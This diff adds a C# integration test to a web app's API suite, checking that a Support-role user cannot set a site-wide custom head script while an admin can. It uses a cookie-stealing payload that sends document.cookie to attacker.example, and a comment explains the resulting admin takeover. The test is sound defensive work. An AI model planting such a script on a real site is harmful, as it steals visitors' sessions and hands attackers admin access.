@@ -246,6 +246,73 @@ public class ApiIntegrationTests : IClassFixture<PhonixAppFactory>
 
     private record CreatedStaff(int Id);
 
+    // CustomHeadScript is raw JavaScript served to every visitor. A Support member who could set it would be
+    // able to act as any admin who later opens the site — the session cookie is sent automatically and the
+    // double-submit CSRF cookie is script-readable by design — turning the "pages" permission into a route to
+    // full admin. The rest of that settings page must stay editable for them.
+    [Fact]
+    public async Task Support_with_pages_permission_cannot_inject_a_custom_head_script()
+    {
+        var admin = await LoginTokenAsync("reza", "1234");
+        await RegisterAsync("pagesonly", "pagesonly@example.com", "test1234");
+        var create = await _client.SendAsync(Authed(HttpMethod.Post, "/api/staff", admin, new
+        {
+            username = "pagesonly", role = "Support", permissions = new[] { "pages" },
+        }));
+        Assert.Equal(HttpStatusCode.OK, create.StatusCode);
+        var created = await create.Content.ReadFromJsonAsync<CreatedStaff>();
+        var staff = await LoginTokenAsync("pagesonly", "test1234");
+
+        var before = await (await _client.SendAsync(Authed(HttpMethod.Get, "/api/advanced-settings", admin)))
+            .Content.ReadFromJsonAsync<AdvancedSettingsDto>();
+
+        var attempt = await _client.SendAsync(Authed(HttpMethod.Put, "/api/advanced-settings", staff, new
+        {
+            metaTitle = "edited by support",
+            metaDescription = before!.MetaDescription,
+            metaKeywords = before.MetaKeywords,
+            maintenanceMode = before.MaintenanceMode,
+            maintenanceTitle = before.MaintenanceTitle,
+            maintenanceMessage = before.MaintenanceMessage,
+            analyticsId = before.AnalyticsId,
+            customHeadScript = "fetch('https://attacker.example/'+document.cookie)",
+            terms = before.Terms,
+        }));
+        Assert.Equal(HttpStatusCode.OK, attempt.StatusCode);
+
+        var after = await (await _client.SendAsync(Authed(HttpMethod.Get, "/api/advanced-settings", admin)))
+            .Content.ReadFromJsonAsync<AdvancedSettingsDto>();
+
+        // The script is untouched, while the ordinary content edit on the same request went through.
+        Assert.Equal(before.CustomHeadScript, after!.CustomHeadScript);
+        Assert.DoesNotContain("attacker.example", after.CustomHeadScript);
+        Assert.Equal("edited by support", after.MetaTitle);
+
+        // An Admin is still allowed to set it.
+        var byAdmin = await _client.SendAsync(Authed(HttpMethod.Put, "/api/advanced-settings", admin, new
+        {
+            metaTitle = after.MetaTitle,
+            metaDescription = after.MetaDescription,
+            metaKeywords = after.MetaKeywords,
+            maintenanceMode = after.MaintenanceMode,
+            maintenanceTitle = after.MaintenanceTitle,
+            maintenanceMessage = after.MaintenanceMessage,
+            analyticsId = after.AnalyticsId,
+            customHeadScript = "console.log('set by admin')",
+            terms = after.Terms,
+        }));
+        Assert.Equal(HttpStatusCode.OK, byAdmin.StatusCode);
+        var final = await (await _client.SendAsync(Authed(HttpMethod.Get, "/api/advanced-settings", admin)))
+            .Content.ReadFromJsonAsync<AdvancedSettingsDto>();
+        Assert.Equal("console.log('set by admin')", final!.CustomHeadScript);
+
+        Assert.Equal(HttpStatusCode.NoContent, (await _client.SendAsync(Authed(HttpMethod.Delete, $"/api/staff/{created!.Id}", admin))).StatusCode);
+    }
+
+    private record AdvancedSettingsDto(
+        string MetaTitle, string MetaDescription, string MetaKeywords, bool MaintenanceMode,
+        string MaintenanceTitle, string MaintenanceMessage, string AnalyticsId, string CustomHeadScript, string Terms);
+
     [Fact]
     public async Task Support_with_users_permission_cannot_promote_anyone_to_admin()
     {
